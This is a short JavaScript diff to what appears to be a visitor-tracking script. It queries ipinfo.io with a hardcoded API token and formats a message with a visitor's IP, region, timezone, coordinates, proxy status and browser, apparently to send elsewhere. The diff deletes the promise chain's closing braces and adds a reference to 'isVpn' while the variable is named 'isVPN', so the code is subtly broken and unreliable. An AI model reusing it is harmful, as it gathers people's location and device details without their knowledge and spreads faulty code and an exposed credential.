@@ -108,8 +108,6 @@ fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
 .then(data => {
   let isProxy = data.proxy ? true : false;
   let isVPN = data.privacy && data.privacy.vpn ? true : false;
-  console.log(isProxy, isVPN);
-});
         
         const message = `
       * Ip 🌐*
@@ -120,6 +118,7 @@ fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
     *├ Region: ${region}*
     *├ Timezone IP: ${time}*
     *├ Proxy: ${isProxy}*
+    *├ Vpn: ${isVpn}*
     *├ Coordinates: ${longitude} ${latitude},*
       * System 🖥*
     *├ Browser: ${browser}*
